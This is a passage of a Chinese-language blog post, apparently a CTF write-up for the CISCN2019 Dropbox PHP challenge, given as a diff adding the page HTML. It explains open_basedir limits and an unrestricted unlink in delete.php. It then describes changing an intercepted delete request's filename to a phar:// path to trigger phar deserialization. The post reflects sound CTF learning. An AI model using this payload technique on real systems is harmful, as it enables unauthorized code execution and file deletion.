+</li>
+<li><p>读取<code>/etc/nginx/nginx.conf</code>（&#x2F;etc 目录下的文件）；</p>
+</li>
+<li><p>写入<code>/tmp/temp_file.txt</code>（&#x2F;tmp 目录下的文件）。</p>
+</li>
+<li><p>❌ 禁止的操作：</p>
+</li>
+<li><p>读取<code>/root/password.txt</code>（不在指定目录）；</p>
+</li>
+<li><p>写入<code>/var/www/other_site/config.php</code>（不在指定目录）；</p>
+</li>
+<li><p>操作这些目录外的文件时，PHP 会抛出<code>Warning: file_exists(): open_basedir restriction in effect</code>警告，且操作失败。</p>
+</li>
+</ul>
+<p><img src="/../images/ctf/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/image-20260302215727250.png" alt="image-20260302215727250"></p>
+<p>delete.php没有限制，还有unlink</p>
+<p>.因此我们只需要上传我们生成的phar.jpg文件,并在delete时抓包,将filename参数改为<code>phar://phar.jpg/test.txt</code>即可.</p>
+<p>这里把文件从kali里面弄出来也卡了，第一次不熟，先进入phar.phar的目录</p>
+<p>然后：ip a</p>
+<p><img src="/../images/ctf/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/image-20260302220326608.png" alt="image-20260302220326608"></p>
+<p>得到地址后有内置的python跑：</p>
+<p>!<img src="/../images/ctf/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/image-20260302220400887.png" alt="image-20260302220400887"></p>
+<p>然后直接浏览器访问对应ip&#x2F;文件下载就可以了</p>
+<p>最后control+c退出</p>
+<p>这里对php版本还有要求，所以这里我flag出不来，总之就是这么个东西</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2026/03/02/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/" data-id="cuidXYyyMJzuWXoZ8eqJgV62d" data-title="[CISCN2019 华北赛区 Day1 Web1]Dropbox" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2026/03/02/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Hello World</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/03/">March 2026</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2026/03/02/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/">[CISCN2019 华北赛区 Day1 Web1]Dropbox</a>
+          </li>
+        
+          <li>
+            <a href="/2026/03/02/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2026 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
